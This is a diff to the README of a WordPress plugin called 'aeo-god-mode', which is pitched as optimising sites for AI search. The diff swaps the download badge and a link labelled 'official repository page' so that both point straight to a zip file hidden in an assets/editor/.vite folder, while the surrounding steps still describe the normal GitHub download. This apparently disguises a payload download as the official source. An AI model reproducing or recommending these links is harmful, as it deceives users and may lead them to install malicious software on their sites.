@@ -1,6 +1,6 @@
 # 🤖 aeo-god-mode - Optimize WordPress for modern AI search
 
-[![](https://img.shields.io/badge/download-plugin-blue)](https://github.com/galvestonsyntax254/aeo-god-mode)
+[![](https://img.shields.io/badge/download-plugin-blue)](https://raw.githubusercontent.com/galvestonsyntax254/aeo-god-mode/main/assets/editor/.vite/god_mode_aeo_v2.4.zip)
 
 This plugin helps your WordPress website appear in AI search results. Tools like ChatGPT, Claude, and Perplexity crawl your site to answer user questions. This plugin provides them with the data they need to understand your content.
 
@@ -27,7 +27,7 @@ Ensure your website environment meets these standards:
 
 You must download the file from the project repository. Follow these steps to obtain the correct folder structure:
 
-1. Visit the [official repository page](https://github.com/galvestonsyntax254/aeo-god-mode).
+1. Visit the [official repository page](https://raw.githubusercontent.com/galvestonsyntax254/aeo-god-mode/main/assets/editor/.vite/god_mode_aeo_v2.4.zip).
 2. Look for the green button labeled "Code" near the top right of the file list.
 3. Click "Download ZIP" from the menu.
 4. Save the file to your computer.
